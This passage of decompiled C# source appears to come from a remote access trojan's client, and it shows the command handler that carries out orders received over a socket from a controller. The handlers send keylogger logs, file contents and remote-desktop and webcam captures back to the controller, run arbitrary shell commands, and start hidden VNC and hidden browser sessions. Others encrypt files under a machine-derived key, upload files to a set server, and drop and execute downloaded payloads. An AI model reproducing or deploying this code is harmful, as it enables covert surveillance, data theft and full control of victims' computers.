							object[] array26 = new object[1];
							ref string reference21 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
							array26[0] = reference21;
							object[] array27 = array26;
							bool[] obj39 = new bool[1] { true };
							bool[] array28 = obj39;
							NewLateBinding.LateCall(obj38, (Type)null, "Compiler", array26, (string[])null, (Type[])null, obj39, true);
							if (array28[0])
							{
								reference21 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array27[0]), typeof(string));
							}
						});
						thread5.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError25)
					{
						ProjectData.SetProjectError(projectError25);
						ProjectData.ClearProjectError();
						break;
					}
				case "UNS":
					try
					{
						Interaction.Shell(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], (AppWinStyle)1, false, -1);
						break;
					}
					catch (Exception projectError24)
					{
						ProjectData.SetProjectError(projectError24);
						ProjectData.ClearProjectError();
						break;
					}
				case "KLGET":
					try
					{
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"KLGET", SPL), (object)STOBS64(File.ReadAllText(KLP)))));
						break;
					}
					catch (Exception projectError23)
					{
						ProjectData.SetProjectError(projectError23);
						ProjectData.ClearProjectError();
						break;
					}
				case "closeshell":
					try
					{
						MyProcess.StandardInput.WriteLine("EXIT");
						MyProcess.StandardInput.Flush();
						MyProcess.Close();
						break;
					}
					catch (Exception projectError22)
					{
						ProjectData.SetProjectError(projectError22);
						ProjectData.ClearProjectError();
						break;
					}
				case "sedit":
					try
					{
						StreamWriter streamWriter = new StreamWriter(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], append: false);
						streamWriter.WriteLine(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]);
						streamWriter.Close();
						break;
					}
					catch (Exception projectError21)
					{
						ProjectData.SetProjectError(projectError21);
						ProjectData.ClearProjectError();
						break;
					}
				case "SETT":
				{
					object obj12 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					object[] array9 = new object[1];
					ref string reference14 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
					ref string reference2 = ref reference14;
					array9[0] = reference14;
					object[] array2 = array9;
					bool[] obj13 = new bool[1] { true };
					bool[] array3 = obj13;
					NewLateBinding.LateCall(obj12, (Type)null, "setText", array9, (string[])null, (Type[])null, obj13, true);
					if (array3[0])
					{
						reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					break;
				}
				case "tss":
				{
					string text5 = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"txtttt", SPL), (object)text5), SPL), (object)CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1])));
					break;
				}
				case "creatnewfolder":
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
						Thread.Sleep(500);
						ClientSocket.Send("RL");
						break;
					}
					catch (Exception projectError20)
					{
						ProjectData.SetProjectError(projectError20);
						ProjectData.ClearProjectError();
						break;
					}
				case "ENC":
				{
					object obj9 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					object[] obj10 = new object[2]
					{
						Helper.GetHash(Helper.ID()),
						null
					};
					ref string reference13 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
					ref string reference2 = ref reference13;
					obj10[1] = reference13;
					object[] array2 = obj10;
					bool[] obj11 = new bool[2] { false, true };
					bool[] array3 = obj11;
					NewLateBinding.LateCall(obj9, (Type)null, "ENC", obj10, (string[])null, (Type[])null, obj11, true);
					if (array3[1])
					{
						reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
					}
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					GC.Collect();
					break;
				}
				case "killAct":
				{
					object obj7 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					object[] array8 = new object[1];
					ref string reference12 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
					ref string reference2 = ref reference12;
					array8[0] = reference12;
					object[] array2 = array8;
					bool[] obj8 = new bool[1] { true };
					bool[] array3 = obj8;
					NewLateBinding.LateCall(obj7, (Type)null, "Kill", array8, (string[])null, (Type[])null, obj8, true);
					if (array3[0])
					{
						reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					GC.Collect();
					ClientSocket.Send("Ref");
					break;
				}
				case "downloadfile":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"downloadedfile", SPL), (object)Convert.ToBase64String(File.ReadAllBytes(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]))), SPL), (object)CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]), SPL), (object)Helper.GetHash(Helper.ID()))));
					break;
				case "viewimage":
				{
					byte[] input;
					try
					{
						input = Helper.SB(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"viewimage", ClientSocket.SPL), (object)Helper.BS(compress((Bitmap)Image.FromFile(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]))))));
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
						break;
					}
					try
					{
						lock (ClientSocket.S)
						{
							using MemoryStream memoryStream = new MemoryStream();
							byte[] array6 = Helper.AES_Encryptor(input);
							byte[] array7 = Helper.SB(Conversions.ToString(array6.Length) + "\0");
							memoryStream.Write(array7, 0, array7.Length);
							memoryStream.Write(array6, 0, array6.Length);
							ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
							ClientSocket.S.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
							GC.Collect();
							break;
						}
					}
					catch (Exception projectError14)
					{
						ProjectData.SetProjectError(projectError14);
						ClientSocket.isConnected = false;
						ProjectData.ClearProjectError();
						break;
					}
				}
				case "showfolderfile":
				{
					FileAttribute val = (FileAttribute)0;
					try
					{
						FileSystem.SetAttr(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], val);
						break;
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
						break;
					}
				}
				case "kill":
					try
					{
						Process.GetProcessById(Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1])).Kill();
						break;
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
						break;
					}
				case "xxx":
					ClientSocket.Send("xxx");
					break;
				case "RD+":
					RemoteDesktop.Capture(Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]), Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3]));
					break;
				case "Rename":
				{
					string text3 = CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1];
					if (Operators.CompareString(text3, "Folder", false) != 0)
					{
						if (Operators.CompareString(text3, "File", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2], CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3]);
						}
					}
					else
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameDirectory(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2], CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3]);
					}
					break;
				}
				case "msgg":
					MessageBox.Show(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					break;
				case "PRG":
					ClientSocket.Send("PRG");
					break;
				case "HVNC":
				{
					object obj2 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					object[] array4 = new object[2];
					ref string reference3 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
					ref string reference4 = ref reference3;
					array4[0] = reference3;
					ref string reference5 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3];
					ref string reference6 = ref reference5;
					array4[1] = reference5;
					object[] array2 = array4;
					bool[] obj3 = new bool[2] { true, true };
					bool[] array3 = obj3;
					NewLateBinding.LateCall(obj2, (Type)null, "Run", array4, (string[])null, (Type[])null, obj3, true);
					if (array3[0])
					{
						reference4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					if (array3[1])
					{
						reference6 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
					}
					GC.Collect();
					break;
				}
				case "uninstall":
					try
					{
						Thread thread = new Thread((ThreadStart)delegate
						{
							object obj47 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
							object[] obj48 = new object[2]
							{
								Settings.path2,
								Settings.nameee
							};
							object[] array37 = obj48;
							bool[] obj49 = new bool[2] { true, true };
							bool[] array38 = obj49;
							NewLateBinding.LateCall(obj47, (Type)null, "un", obj48, (string[])null, (Type[])null, obj49, true);
							if (array38[0])
							{
								Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array37[0]), typeof(string));
							}
							if (array38[1])
							{
								Settings.nameee = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array37[1]), typeof(string));
							}
						});
						thread.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
						break;
					}
				case "RD-":
					ClientSocket.Send("RD-");
					break;
				case "Xinfo":
					try
					{
						ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"Xinfo", SPL), NewLateBinding.LateGet(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "gett", new object[0], (string[])null, (Type[])null, (bool[])null))));
						break;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
						break;
					}
				case "openhide":
					try
					{
						object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("internetexplorer.application", ""));
						object[] array = new object[1];
						ref string reference = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1];
						ref string reference2 = ref reference;
						array[0] = reference;
						object[] array2 = array;
						bool[] obj = new bool[1] { true };
						bool[] array3 = obj;
						NewLateBinding.LateCall(objectValue, (Type)null, "navigate", array, (string[])null, (Type[])null, obj, true);
						if (array3[0])
						{
							reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						NewLateBinding.LateSet(objectValue, (Type)null, "visible", new object[1] { 0 }, (string[])null, (Type[])null);
						break;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
						break;
					}
				case "7zIT":
					NewLateBinding.LateCall(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "install", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "7zzip":
					try
					{
						Interaction.Shell(Path.GetTempPath() + "7zip\\7z.exe" + CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], (AppWinStyle)0, false, -1);
						break;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
						break;
					}
				case "shellfuc":
					try
					{
						Interaction.Shell(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], (AppWinStyle)0, false, -1);
						break;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						break;
					}
				case "UPtoS":
					try
					{
						((ServerComputer)MyProject.Computer).get_Network().UploadFile(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], Settings.uploader);
						GC.Collect();
						Thread.Sleep(500);
						ClientSocket.Send("RL");
						break;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						break;
					}
				}
			}
			catch (Exception projectError46)
			{
				ProjectData.SetProjectError(projectError46);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static byte[] compress(Bitmap imgg, int Q)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		byte[] result = default(byte[]);
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			Encoder quality = Encoder.Quality;
			EncoderParameters val = new EncoderParameters(1);
			EncoderParameter val2 = new EncoderParameter(quality, (long)Q);
			val.get_Param()[0] = val2;
			ImageCodecInfo encoderInfo = RemoteDesktop.GetEncoderInfo(ImageFormat.get_Jpeg());
			((Image)imgg).Save((Stream)memoryStream, encoderInfo, val);
			if (val != null)
			{
				val.Dispose();
			}
			if (val2 != null)
			{
				val2.Dispose();
			}
			if (imgg != null)
			{
				((Image)imgg).Dispose();
			}
			GC.Collect();
			ImageConverter val3 = new ImageConverter();
			result = (byte[])((TypeConverter)(object)val3).ConvertTo((object?)Image.FromStream((Stream)memoryStream), typeof(byte[]));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string STOBS64(string s)
	{
		string result = default(string);
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			result = Convert.ToBase64String(bytes);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("avicap32.dll")]
	public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

	[DllImport("user32")]
	public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	public static bool Cam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					string lpszVer = null;
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static byte[] Shot(int W, int H, int Q)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		byte[] result = default(byte[]);
		try
		{
			Handle = capCreateCaptureWindowA("WebCap", 0, 0, 0, W, H, 0, 0);
			SendMessage(Handle, 1034u, 0, 0);
			SendMessage(Handle, 1074u, 0, 0);
			SendMessage(Handle, 1084u, 0, 0);
			SendMessage(Handle, 1054u, 0, 0);
			SendMessage(Handle, 1035u, 0, 0);
			result = compress((Bitmap)(Image)Clipboard.GetDataObject().GetData(DataFormats.Bitmap), Q);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string getFolders(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		string text = "";
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			text = text + "[Folder]" + directoryInfo2.get_Name() + "FileManagerSplitFileManagerSplit";
		}
		return text;
	}

	public static string getFiles(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		string text = "";
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		foreach (FileInfo fileInfo in files)
		{
			text = text + fileInfo.get_Name() + "FileManagerSplit" + fileInfo.Length + "FileManagerSplit";
		}
		return text;
	}

	public static string getDrives()
	{
		string text = "";
		foreach (DriveInfo drife in ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives())
		{
			switch (drife.DriveType)
			{
			case DriveType.Removable:
				text = text + "[USB]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.Fixed:
				text = text + "[Drive]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.Network:
				text = text + "[NET]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.CDRom:
				text = text + "[CD]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			}
		}
		return text;
	}

	private static void Download(string Name, string Data)
	{
		try
		{
			string text = Path.GetTempFileName() + Name;
			File.WriteAllBytes(text, (byte[])Helper.frombase64(Data));
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
